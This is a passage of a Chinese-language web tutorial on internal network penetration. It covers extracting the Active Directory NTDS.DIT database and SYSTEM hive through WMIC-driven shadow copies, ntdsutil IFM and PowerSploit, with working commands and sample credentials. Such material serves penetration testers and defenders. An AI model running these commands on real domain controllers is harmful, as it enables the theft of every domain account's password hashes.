&quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">活动目录数据库（NTDS.DIT）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Active Directory域数据库存储在ntds.dit文件中（默认存储在c：WindowsNTDS中，AD数据库是Jet数据库引擎，它使用提供数据存储和索引服务的可扩展存储引擎（ESE）ESE级索引引对对象属性可以快速定位.ESE确保数据库符合ACID（原子性，一致性，隔离性和持久性） - 交易中的所有操作完成或不执行.AD ESE数据库非常快速和可靠。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;"><img class="" data-backh="324" data-backw="467" data-before-oversubscription-url="https://i.imgur.com/bRRppmk.gif" data-ratio="0.6937901498929336" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/20_lsGQocwSVicNcAr41Gsk4u7a7RicxQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVX2fmQMFXKTAzqnykITEPrkrLAslsGQocwSVicNcAr41Gsk4u7a7RicxQ/640?wx_fmt=gif'" data-type="gif" data-w="467" style="width: 100%;height: auto;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">目录分区</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">NTDS.DIT文件由三个主表组成：数据表，链接表和SD表。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">具体详细资料查看：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://technet.microsoft.com/en-us/library/cc772829(v=ws.10).aspx</span></p><h3 name="h3-11" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用VSS卷影副本</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">什么是卷影副本？</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">卷影副本，也称为快照，是存储在Data Protection Manager（DPM）服务器上的副本的时间点副本。副本是文件服务器上单个卷的受保护共享，文件夹和文件的完整时间点副本。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">支持操作系统：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Windows Server 2003，Windows Server 2008，Windows Server 2003 R2，Windows Server 2008 R2，Windows Server 2012，Windows 8</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">通常拿下一台服务器时准备内网渗透，需要传你的工具到目标机器中，而且是长久渗透的这种，为了不被发现！获取系统SAM文件等</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用VSS卷影副本（通过WMI或PowerShell的远程处理）远程提取NTDS.DIT</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">窗口有一个名为WMI的内置管理组件，支持远程执行（需要管理员权限）.WMIC是在远程计算机上执行命令的WMI命令工具。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">利用WMIC（或PowerShell的远程处理）创建（或复制现有的）VSS。</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cpp" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">wmic /node:AD /user:PENTESTAdministrator /password:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">123</span>qweQWE!@<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;"># process call create "cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:vss.log"</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.2046875" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/21_MIIVkiaxicWRFLia1O3cRHibaWjWkw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVaoOCBdg4r6XYuQJrA1vuGGojUuflMIIVkiaxicWRFLia1O3cRHibaWjWkw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1280" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">查看vss.log</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.2639593908629442" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/22_5uibN9I4HuIeCzKeDbB5wdcGEUTfww.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVTpHVFDWzGUcXice0I5UfoxQH875uibN9I4HuIeCzKeDbB5wdcGEUTfww/640?wx_fmt=jpeg'" data-type="jpeg" data-w="788" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cpp" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">wmic /node:AD /user:PENTESTadministrator /password:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">123</span>qwe!@#!@<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;"># process call create "cmd /c copy 卷影IDWindowsNTDSNTDS.dit C:windowstempNTDS.dit 2&gt;&amp;1"</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.1678681771369722" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/23_qa7nIbv81aZaLzVeZlbjoKAgG8fy5A.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibV6PVHleKCMChJtpe24ibRjnUDMqa7nIbv81aZaLzVeZlbjoKAgG8fy5A/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1942" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cpp" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">wmic /node:AD /user:PENTESTadministrator /password:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">123</span>qwe!@<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;"># process call create "cmd /c copy 卷影IDWindowsSystem32configSYSTEM c:windowstempSYSTEM.hive 2&gt;&amp;1"</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.17484662576687116" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/24_gjPejibYeMoDtEvbMmXBEE1zuehJew.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVVzoUExpCFTKQtN1Bky2qGWNa1gjPejibYeMoDtEvbMmXBEE1zuehJew/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1956" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">net</span> use k: \pentest.comc$</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.48577680525164113" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/25_FicfEw2LJNnLv2ZRnChl7XiaQmrnTw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVgRibCZhkEfd4vhIXVtLhv0glVMEFicfEw2LJNnLv2ZRnChl7XiaQmrnTw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="914" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">利用这种方法可以和上面的Kerberos的票结合来实现</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用DIT Snapshot Viewer可以验证我们是否成功地获得了ntds.dit文件。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/yosqueoy/ditsnap</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.4734042553191489" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/26_ohAMawvQYRRuh5sDBs5H3ibILhYS8g.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVut3jg1kbKFmpxnk3XCMDXa5ibDohAMawvQYRRuh5sDBs5H3ibILhYS8g/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1880" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><h3 name="h3-12" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Ntdsutil中获取NTDS.DIT文件</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Ntdsutil.exe是一个为Active Directory提供管理设施的命令行工具。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用NTDSUTIL的IFM创建（VSS卷影副本）在DC上本地引用NTDS.DIT</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">NTDSUtil是本地处理AD DB的命令实用程序（ntds.dit），并为DCPromo启用IFM集创建.IFM与DCPromo一起用于“从媒体安装”，因此被升级的服务器不需要通过网络从另一个DC复制域数据。</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">ntdsutil</span> <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"ac i ntds"</span> <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"ifm"</span> <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"create full c:temp"</span> q q</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">当创建一个IFM时，VSS快照被拍摄，挂载，NTDS.DIT文件和相关数据被复制到目标文件夹中。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">此命令也可以通过WMI或PowerShell的远程执行。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.5262172284644194" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/27_Ya0t1kiapvStuCrXic5GiaVs7uibYw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVkBWf4aqzM4M5sk5NyTAUBW7n0qqGYa0t1kiapvStuCrXic5GiaVs7uibYw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1068" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.2553699284009546" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/28_3ibvGIOnRcCImeszZDib4icdH9hPJw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVr2s7olC9Q6q4OpmmCb3lPP5EVJ13ibvGIOnRcCImeszZDib4icdH9hPJw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="838" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /><span style="color: rgba(0, 0, 0, 0.85);">PowerShell提取ntds.dit</span></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">使用PowerSploit的Invoke-NinjaCopy远程提取ntds.dit（需要在目标DC上启用PowerShell远程处理功能）。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, 